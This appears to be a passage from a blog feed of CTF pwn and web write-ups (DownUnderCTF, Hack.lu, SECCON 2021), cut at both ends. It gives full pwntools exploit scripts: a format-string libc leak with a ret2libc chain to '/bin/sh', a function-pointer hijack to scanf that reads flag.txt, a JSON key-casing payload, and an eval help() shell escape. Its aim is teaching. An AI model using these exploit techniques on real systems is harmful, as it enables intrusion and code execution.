class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">import os</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x10+0x8)+(0x401016).to_bytes(0x8,&quot;little&quot;)+(0x004011d7).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>DUCTF{<a href="https://www.youtube.com/watch?v=XfR9iY5y94s%7D">https://www.youtube.com/watch?v=XfR9iY5y94s}</a></p>
]]></content>
  </entry>
  <entry>
    <title>[writeup][DownUnderCTF 2021] pwn oversight</title>
    <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-oversight.html</url>
    <content><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>this a typical ret2libc problem using rop chain.</p>
<p>require reveal the base point for libc, find offset and setup ropchain</p>
<span id="more"></span>

<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="vuln-1"><a href="#vuln-1" class="headerlink" title="vuln 1"></a>vuln 1</h3><p>in the <code>sym.wait()</code>, the prinf in the will give a format of <code>&quot;%val$llx&quot;</code>, where val can be input by by users.</p>
<p>Therefore, we got a way to leak address in the stack (see <a href="/2021/10/09/ductf2021-pwn-leaking-like-a-sieve/">here</a> if your don&#39;t why), which could help to find the <strong>libc</strong> base address</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void wait(void)</span><br><span class="line">&#123;</span><br><span class="line">	// ignored</span><br><span class="line">    printf(&quot;Pick a number: &quot;);</span><br><span class="line">    fgets(&amp;var_85h, 5, _stdin);</span><br><span class="line">    uVar1 = strtol(&amp;var_85h, 0, 10);</span><br><span class="line">    snprintf((int64_t)&amp;var_85h + 5, 100, &quot;Your magic number is: %%%d$llx\n&quot;, uVar1)</span><br><span class="line">    // ignored</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="vuln-2"><a href="#vuln-2" class="headerlink" title="vuln 2"></a>vuln 2</h3><p>in the <code>sym.echo_inner</code>, we can write max 256(0x100) byte to a 256 byte long char pointer. </p>
<p>however, the <code>fread</code> will set next byte to zero. </p>
<p>in this case, since the char pointer is locate at <code>sym.echo</code> and the stack for sym.echo is 0x100 long, the next byte will appear in the save rbp</p>
<p>since saved rbp is little, the last byte of saved rbp will set to zero, which means the rbp for <code>sym.echo</code> will decrease&#x2F;move up some position</p>
<p>for example,</p>
<p>if the origin rbp of <code>sym.echo</code> is <code>0x1010</code> after <code>fread</code>, it will become <code>0x1000</code>, which decrease by 0x10.</p>
<p>moreover, the stack above origin rbp is the char array that we can control. by using <code>fread</code>, we can easily construct a stack that do what ever we want.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000012a5      488b0dd42d00.  mov rcx, qword [obj.stdin]  ; obj.stdin_GLIBC_2.2.5 ; [0x4080:8]=0 ; FILE *stream</span><br><span class="line">0x000012ac      e88ffdffff     call sym.imp.fread          ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</span><br><span class="line">0x000012b1      488d3d5c0d00.  lea rdi, str.You_said:      ; 0x2014 ; &quot;You said:&quot; ; const char *s</span><br><span class="line">0x000012b8      4898           cdqe</span><br><span class="line">0x000012ba      41c6040400     mov byte [r12 + rax], 0</span><br></pre></td></tr></table></figure>
<h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>check the stack after printf, we can use 5+12 &#x3D; 17 to leak <code>stdout</code> address.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffe89512620 0x0000000000000d68   h....... @ rsp 3432</span><br><span class="line">0x7ffe89512628 0x00000a373183bad1   ...17...</span><br><span class="line">0x7ffe89512630 0x67616d2072756f59   Your mag @ r12 ascii (&#x27;Y&#x27;)</span><br><span class="line">0x7ffe89512638 0x65626d756e206369   ic numbe ascii (&#x27;i&#x27;)</span><br><span class="line">0x7ffe89512640 0x3125203a73692072   r is: %1 ascii (&#x27;r&#x27;)</span><br><span class="line">0x7ffe89512648 0x00000a786c6c2437   7$llx...</span><br><span class="line">0x7ffe89512650 0x000055c13fc96070   p`.?.U.. /home/aynakeya/ctf/ducctf/pwn100-oversight/oversight .bss section..bss,reloc.stdout reloc.__cxa_finalize program R W 0x7fbcb29946a0</span><br><span class="line">0x7ffe89512658 0x00007fbcb29954a0   .T...... /usr/lib/x86_64-linux-gnu/libc-2.31.so library R W 0x0</span><br><span class="line">0x7ffe89512660 ..[ null bytes ]..   00000000</span><br><span class="line">0x7ffe89512668 0x00007fbcb283c013   ........ /usr/lib/x86_64-linux-gnu/libc-2.31.so library R X &#x27;cmp eax, 0xffffffff&#x27; &#x27;libc-2.31.so&#x27;</span><br><span class="line">0x7ffe89512670 0x0000000000000010   ........ 16</span><br><span class="line">0x7ffe89512678 0x00007fbcb29946a0   .F...... /usr/lib/x86_64-linux-gnu/libc-2.31.so library R W 0xfbad2887</span><br><span class="line">0x7ffe89512680 0x000055c13fc94075   u@.?.U.. /home/aynakeya/ctf/ducctf/pwn100-oversight/oversight .rodata str.Lets_play_a_game program R 0x616c70207374654c Lets play a game</span><br></pre></td></tr></table></figure>

<h3 id="construct-stack"><a href="#construct-stack" class="headerlink" title="construct stack"></a>construct stack</h3><p>last 00 are required for alignment</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ rsp</span><br><span class="line">ret;</span><br><span class="line">. (new rbp may land here)</span><br><span class="line">. many ret;</span><br><span class="line">. (or here)</span><br><span class="line">ret;</span><br><span class="line">pop rdi; ret;</span><br><span class="line">pointer of &quot;/bin/sh&quot;</span><br><span class="line">call system</span><br><span class="line">00</span><br><span class="line">@ origin rbp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31909&#x27; oversight</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;oversight&#x27;)</span><br><span class="line">libc = ELF(&quot;libc-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31909)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">def get_pointer(address:int):</span><br><span class="line">    return address.to_bytes(0x8,&quot;little&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line">io.send(b&quot;\n&quot;)</span><br><span class="line">print(123)</span><br><span class="line">io.sendlineafter(b&quot;Pick a number: &quot;,str(5+12).encode())</span><br><span class="line">io.recvuntil(b&quot;Your magic number is: &quot;)</span><br><span class="line">data = io.recv()</span><br><span class="line">print(data)</span><br><span class="line">libc_stdout_address = int(data.decode().split(&quot;\n&quot;)[0],16)</span><br><span class="line">print(libc_stdout_address)</span><br><span class="line">libc_base = libc_stdout_address - 0x003ec760</span><br><span class="line">libc_pop_rdi = libc_base + 0x215bf</span><br><span class="line">libc_ret = libc_base + 0x08aa</span><br><span class="line">libc_bin_sh = libc_base + 0x001b3e1a</span><br><span class="line">libc_system = libc_base + 0x4f550</span><br><span class="line">mystack =  get_pointer(libc_pop_rdi) + get_pointer(libc_bin_sh) + get_pointer(libc_system) + get_pointer(0)</span><br><span class="line">payload = get_pointer(libc_ret)*(256 // 8 -len(mystack) // 8)+mystack</span><br><span class="line">print(&quot;len of payload %d&quot; % (len(payload) / 8))</span><br><span class="line">io.sendline(b&quot;256&quot;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">print(&quot;recved&quot;)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>DUCTF{1_sm@LL_0ver5ight&#x3D;0v3rFLOW}</p>
]]></content>
  </entry>
  <entry>
    <title>DownUnder CTF 2021</title>
    <url>/ctf-writeup/2021/downunderctf/index.html</url>
    <content><![CDATA[<h1 id="DownUnder-CTF-2021"><a href="#DownUnder-CTF-2021" class="headerlink" title="DownUnder CTF 2021"></a>DownUnder CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./ductf2021-pwn-Leaking-like-a-sieve">[Pwn] Leaking-like-a-sieve</a></li>
<li><a href="./ductf2021-pwn-deadcode">[Pwn] deadcode</a></li>
<li><a href="./ductf2021-pwn-oversight">[Pwn] oversight</a></li>
<li><a href="./ductf2021-pwn-babygame">[Pwn] babygame</a></li>
<li><a href="./ductf2021-pwn-outbackdoor">[Pwn] outbackdoor</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
    <url>/ctf-writeup/2021/hackerluctf/hacker-lu-2021-secure-prototype.html</url>
    <content><![CDATA[<h1 id="0x1-introduction"><a href="#0x1-introduction" class="headerlink" title="0x1 introduction"></a>0x1 introduction</h1><p><a href="https://flu.xxx/challenges/16">https://flu.xxx/challenges/16</a></p>
<h1 id="0x3-Mitigations"><a href="#0x3-Mitigations" class="headerlink" title="0x3 Mitigations"></a>0x3 Mitigations</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>

<h1 id="0x3-Solution"><a href="#0x3-Solution" class="headerlink" title="0x3 Solution"></a>0x3 Solution</h1><p>challenge contains 3 file, challenge.elf, stonks.txt, flag.txt</p>
<p>using decompiler and take a deep look at functions.</p>
<span id="more"></span>

<p><img data-src="/./images/2021-10-31_151419.jpg" alt="2021-10-31_151419.jpg"></p>
<p>after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.</p>
<p><img data-src="/./images/2021-10-31_151832.jpg" alt="2021-10-31_151832.jpg"></p>
<p>notice that string &quot;stonks.txt&quot; are stored in the <code>byte_22058</code>, and with commmand <em>48</em>, function <code>sub_10B80</code> will read <code>byte_22058</code> as a filename, and print out whether in the file.</p>
<p>so, we got an idea that if we need get the flag, we need to change <code>byte_22058</code> to &quot;flag.txt&quot; instead of &quot;stonks.txt&quot;</p>
<p>looking at other commands, command <em>1056</em> allow us pass a integer as a pointer to an function (lets say <strong>funcA</strong>).</p>
<p>and with command <em>4619</em>, we have call <strong>funcA</strong> with our 1st and 2nd parameter.</p>
<p>so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. </p>
<p>the answer is <code>plt:00010570 __isoc99_scanf</code>, we can use <code>scanf(&quot;%s&quot;,char* str)</code> to read input from stdin and write str.</p>
<p>in this case, str is the address of <code>byte_22058</code>, and &quot;%s&quot; can also found in the data section.</p>
<p>therefore, we have the process of getting the flag.</p>
<ol>
<li>use 1056: change function address to scanf</li>
<li>use 4619: call scanf and write flag.txt to byte_22058</li>
<li>use 48: print out the file content in filename(byte_22058)</li>
</ol>
<h1 id="0x4-exp-py"><a href="#0x4-exp-py" class="headerlink" title="0x4 exp.py"></a>0x4 exp.py</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=flu.xxx&#x27; &#x27;--port=20040&#x27; challenge.elf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;challenge.elf&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;flu.xxx&#x27;</span><br><span class="line">port = int(args.PORT or 20040)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak *0x&#123;exe.entry:x&#125;</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     arm-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x10000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;1056&quot;)</span><br><span class="line">print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;66928 0 0&quot;)</span><br><span class="line">print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;4919&quot;)</span><br><span class="line">print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;70140 139352 0&quot;)</span><br><span class="line">io.sendline(b&quot;flag.txt\x00&quot;)</span><br><span class="line">print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;48&quot;)</span><br><span class="line">print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))</span><br><span class="line">io.sendline(b&quot;123 456 789&quot;)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;%%s&quot;,0x111fc)</span><br><span class="line">print(&quot;22058&quot;,0x0022058)</span><br><span class="line">print(&quot;scanf&quot;,0x00010570)</span><br></pre></td></tr></table></figure>

<h1 id="0x5-flag"><a href="#0x5-flag" class="headerlink" title="0x5 flag"></a>0x5 flag</h1><p>flag{gl0bal_st0nkz_and_gl0bal_var1abl3}</p>
]]></content>
  </entry>
  <entry>
    <title>Hacker.lu CTF 2021</title>
    <url>/ctf-writeup/2021/hackerluctf/index.html</url>
    <content><![CDATA[<h1 id="Hacker-lu-CTF-2021"><a href="#Hacker-lu-CTF-2021" class="headerlink" title="Hacker.lu CTF 2021"></a>Hacker.lu CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./hacker-lu-2021-secure-prototype">[Pwn] secure-prototype</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Seccon CTF 2021</title>
    <url>/ctf-writeup/2021/secconctf/index.html</url>
    <content><![CDATA[<h1 id="Seccon-CTF-2021"><a href="#Seccon-CTF-2021" class="headerlink" title="Seccon CTF 2021"></a>Seccon CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./seccon-2021-write-up">writeup</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>【Seccon CTF 2021】write up 【pwn】【web】【misc】</title>
    <url>/ctf-writeup/2021/secconctf/seccon-2021-write-up.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>I participate seccon 2021 yesterday.</p>
<ul>
<li><a href="#0x1-Web-vulnerabilities">web-vulnerabilities</a></li>
<li><a href="#0x2-Misc-hitchhike">misc-hitchhike</a></li>
<li><a href="#0x3-Pwn-kasu-bof">pwn-kasu_bof</a></li>
<li><a href="#0x4-pwn-average">pwn-average</a></li>
</ul>
<span id="more"></span>

<h1 id="0x1-Web-vulnerabilities"><a href="#0x1-Web-vulnerabilities" class="headerlink" title="0x1 Web - vulnerabilities"></a>0x1 Web - vulnerabilities</h1><h2 id="basic-idea"><a href="#basic-idea" class="headerlink" title="basic idea"></a>basic idea</h2><p>The program is a web service written in golang. The flag is stored in a in-memory sqlite database.</p>
<p>The data structure of table is called <strong>Vulnerability</strong><img data-src="/./images/2021-12-12_144720.jpg" alt="2021-12-12_144720.jpg"></p>
<p>the flag is stored at the last row of the sqlite table.<img data-src="/./images/2021-12-12_144910.jpg" alt="2021-12-12_144910.jpg"></p>
<h2 id="vulnerable"><a href="#vulnerable" class="headerlink" title="vulnerable"></a>vulnerable</h2><p>the vulnerable is locate at the post method of api</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r.POST(&quot;/api/vulnerability&quot;, func(c *gin.Context) &#123;</span><br><span class="line">	//	Validate the parameter</span><br><span class="line">	var json map[string]interface&#123;&#125;</span><br><span class="line">	if err := c.ShouldBindBodyWith(&amp;json, binding.JSON); err != nil &#123;</span><br><span class="line">		c.JSON(400, gin.H&#123;&quot;Error&quot;: &quot;JSON error 1&quot;&#125;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	if name, ok := json[&quot;Name&quot;]; !ok || name == &quot;&quot; || name == nil &#123;</span><br><span class="line">		c.JSON(400, gin.H&#123;&quot;Error&quot;: &quot;no \&quot;Name\&quot;&quot;&#125;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//	Get details of the vulnerability</span><br><span class="line">	var query Vulnerability</span><br><span class="line">	if err := c.ShouldBindBodyWith(&amp;query, binding.JSON); err != nil &#123;</span><br><span class="line">		c.JSON(400, gin.H&#123;&quot;Error&quot;: &quot;JSON error 2&quot;&#125;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	var vuln Vulnerability</span><br><span class="line">	if err := db.Where(&amp;query).First(&amp;vuln).Error; err != nil &#123;</span><br><span class="line">		c.JSON(404, gin.H&#123;&quot;Error&quot;: &quot;not found&quot;&#125;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.JSON(200, gin.H&#123;</span><br><span class="line">		&quot;Logo&quot;: vuln.Logo,</span><br><span class="line">		&quot;URL&quot;:  vuln.URL,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>if we want to query the flag by the <strong>Vulnerability</strong> struct, the only way is query the flag by its&#39; ID (in this case flag have id 14), as defined in the <strong>gorm.Model</strong><br><img data-src="/./images/2021-12-12_145338.jpg" alt="2021-12-12_145338.jpg"></p>
<p>And every other field in the struct should be zero values (&quot;&quot;,0 ...),  Therefore, we need to find a way to let <code>json[&quot;Name&quot;]!=&quot;&quot;</code> and <code>vuln.Name == &quot;&quot;</code></p>
<p>Since <em>json</em> is a <strong>map[string]interface{}</strong>, which means it is case sensitive, <code>&quot;Name&quot;</code> and <code>&quot;name&quot;</code> are two different thing. But how golang struct, when unmarshal, <code>&quot;Name&quot;</code> and <code>&quot;name&quot;</code> are considered as same key, also the second value will overwrite first value.</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><p>Make &quot;Name&quot; &#x3D; &quot;Heartbleed&quot; two bypass first check, than use &quot;name&quot; &#x3D; &quot;&quot; to overwrite <code>vuln.Name</code>. Use &quot;ID&quot; &#x3D; 14 to query the flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;https://vulnerabilities.quals.seccon.jp/api/vulnerability&quot;</span><br><span class="line">payload=&quot;&#123;\&quot;Name\&quot;:\&quot;Heartbleed\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;ID\&quot;:14&#125;&quot;</span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>SECCON{LE4RNING_FR0M_7HE_PA5T_FINDIN6_N0TABLE_VULNERABILITIE5}</p>
<h1 id="0x2-Misc-hitchhike"><a href="#0x2-Misc-hitchhike" class="headerlink" title="0x2 Misc - hitchhike"></a>0x2 Misc - hitchhike</h1><p><strong>Everything is 42</strong></p>
<h2 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h2><p>the server.py.</p>
<p><img data-src="/./images/2021-12-12_150212.jpg" alt="2021-12-12_150212.jpg"></p>
<h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>The first 4 element can convert to 42 by a general solution <code>&quot;0 or 42&quot;</code></p>
<p>It is impossible to find a string v that makes <code>eval(f&#39;&#123;&#123;b'6':6666&#125;&#125; * &#123;v&#125;&#39;, &#123;&#125;, &#123;&#125;) == 42</code>, because dict can&#39;t multiply with any other thing.</p>
<p>but sinces it use eval, we can get a simple shell using <code>help()</code></p>
<ol>
<li>enter help()</li>
<li>enter os</li>
<li>since the flag is in the environment variable, use !env to get the flag</li>
</ol>
<p><img data-src="/./images/2021-12-12_150834.jpg" alt="2021-12-12_150834.jpg"><img data-src="/./images/2021-12-12_150918.jpg" alt="2021-12-12_150918.jpg"></p>
<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><p>SECCON{1_b3li3v3_th1s_1s_th3_sh0rt3st_Pyth0n_c0d3_2_g3t_SH3LL}</p>
<h1 id="0x3-Pwn-kasu-bof"><a href="#0x3-Pwn-kasu-bof" class="headerlink" title="0x3 Pwn - kasu_bof"></a>0x3 Pwn - kasu_bof</h1><h2 id="tl-dr-1"><a href="#tl-dr-1" class="headerlink" title="tl;dr"></a>tl;dr</h2><p>return to dl resolve. just refer to my article <a href="/2021/11/18/ret2-dl-resolve-example-silent-rop/">ret2-dl-resolve-example-silent-rop</a></p>
<h2 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;chall&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;hiyoko.quals.seccon.jp&quot;</span><br><span class="line">    port = 9001</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, 